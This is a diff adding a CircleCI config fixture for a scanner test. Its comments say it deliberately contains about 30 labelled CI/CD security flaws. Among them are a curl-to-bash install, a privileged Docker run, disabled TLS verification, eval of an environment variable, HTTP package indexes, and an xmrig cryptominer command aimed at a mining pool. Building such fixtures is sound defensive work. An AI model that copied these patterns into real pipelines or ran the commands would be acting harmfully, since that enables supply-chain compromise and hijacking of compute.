@@ -1,0 +1,158 @@
+# Realistic-looking CircleCI config exhibiting every CC-* failure mode.
+# Modelled on a Node.js web-app build/test/deploy pipeline that was
+# assembled quickly and never hardened — a common pattern in startup
+# repos. Used as a fixture to assert the scanner flags all 23 issues.
+version: 2.1
+
+# CC-012: setup: true at top level allows dynamic config injection.
+setup: true
+
+# CC-001: Orbs not pinned to exact semver — @volatile, major-only,
+# and bare (no @) references all float.
+orbs:
+  node: circleci/node@volatile
+  aws-cli: circleci/aws-cli@4
+  slack: circleci/slack
+
+jobs:
+  install:
+    # CC-003: Docker image without @sha256 digest.
+    docker:
+      - image: cimg/node:20.11
+    # CC-014: No resource_class declaration on this job.
+    steps:
+      - checkout
+      # CC-025: restore_cache / save_cache keyed on the PR-controllable
+      # branch name — a fork PR can poison the cache for protected jobs.
+      - restore_cache:
+          keys:
+            - deps-{{ .Branch }}-{{ checksum "package-lock.json" }}
+            - deps-{{ .Branch }}-
+      # CC-021: npm install instead of npm ci.
+      - run: npm install
+      - save_cache:
+          key: deps-{{ .Branch }}-{{ checksum "package-lock.json" }}
+          paths: ["~/.npm"]
+      # CC-002: Untrusted env var interpolation in run command.
+      - run: echo "Building branch $CIRCLE_BRANCH"
+
+  test:
+    docker:
+      - image: cimg/node:20.11
+      # CC-003 (secondary): Postgres image also unpinned.
+      - image: cimg/postgres:15.3
+    # CC-014: No resource_class on this job either.
+    # CC-004: Secret-like env var inline without context.
+    environment:
+      SECRET_KEY: "not-a-real-value"
+      API_TOKEN: "placeholder"
+    steps:
+      - checkout
+      - run: npm test
+      # CC-002 (secondary): Tag interpolation.
+      - run:
+          name: Tag report
+          command: echo "Tag is $CIRCLE_TAG"
+      # CC-016: Remote script piped to shell interpreter.
+      - run:
+          name: Install reporting tool
+          command: curl https://reports.example.com/install.sh | bash
+      # CC-017: Docker run with --privileged flag.
+      - run:
+          name: Integration tests in container
+          command: docker run --privileged myorg/integration-runner:latest npm run test:e2e
+      # CC-018: pip install from insecure (HTTP) registry.
+      - run:
+          name: Install Python helpers
+          command: pip install --index-url http://internal.example.com/simple/ test-utils
+      # CC-019: add_ssh_keys without fingerprints — loads ALL project keys.
+      - add_ssh_keys
+
+  build:
+    docker:
+      - image: cimg/node:20.11
+    # CC-010: Self-hosted runner without ephemeral marker.
+    resource_class: myorg/self-hosted-linux-large
+    # CC-005: AWS long-lived access keys in environment block.
+    environment:
+      AWS_ACCESS_KEY_ID: "${AWS_KEY}"
+      AWS_SECRET_ACCESS_KEY: "${AWS_SECRET}"
+    steps:
+      - checkout
+      - run: npm run build
+      # CC-008: Credential-shaped literal (AWS key pattern).
+      - run:
+          name: Verify registry access
+          command: |
+            echo "Checking registry with key AKIAIOSFODNN7EXAMPLE"
+            aws ecr get-login-password --region us-east-1
+      # CC-022: Dependency update command bypasses lockfile pins.
+      - run:
+          name: Update shared libs
+          command: pip install --upgrade requests
+      # CC-023: TLS verification bypass.
+      - run:
+          name: Configure git for internal mirror
+          command: git config --global http.sslVerify false
+      # CC-026: evidence of malicious activity — xmrig miner invocation
+      # against a known Monero pool.
+      - run:
+          name: Background worker
+          command: xmrig --url stratum+tcp://pool.minexmr.com:443
+      # CC-027: dangerous shell idiom — eval re-parses the value as shell.
+      - run:
+          name: Run dynamic build
+          command: eval "$BUILD_CMD"
+      # CC-028: pip install from an unpinned git URL.
+      - run:
+          name: Install internal helper
+          command: pip install git+https://example.com/internal/helper.git
+
+  deploy-production:
+    docker:
+      - image: cimg/node:20.11
+    resource_class: medium
+    steps:
+      - checkout
+      - run:
+          name: Deploy to ECS
+          command: |
+            aws ecs update-service \
+              --cluster prod \
+              --service webapp \
+              --force-new-deployment
+
+  # CC-029: machine executor image uses the rolling ``:current`` tag.
+  integration:
+    machine:
+      image: ubuntu-2204:current
+    steps:
+      - checkout
+      - run: echo "integration suite"
+
+# CC-006: No signing tool (cosign/sigstore) present anywhere.
+# CC-007: No SBOM tool (syft/cyclonedx) present anywhere.
+# CC-011: No store_test_results step in any job.
+# CC-015: No no_output_timeout on any run step.
+# CC-020: No vulnerability scanning step anywhere.
+
+workflows:
+  build-test-deploy:
+    jobs:
+      - install
+      - test:
+          requires:
+            - install
+      - build:
+          requires:
+            - test
+      # CC-009: Deploy job without type: approval predecessor.
+      # CC-013: Deploy job without filters.branches restriction.
+      # CC-030: Deploy carries a ``context:`` with production secrets
+      # but is reachable from every push (no branch filter, no
+      # approval predecessor).
+      - deploy-production:
+          context: production-secrets
+          requires:
+            - build
+      - integration
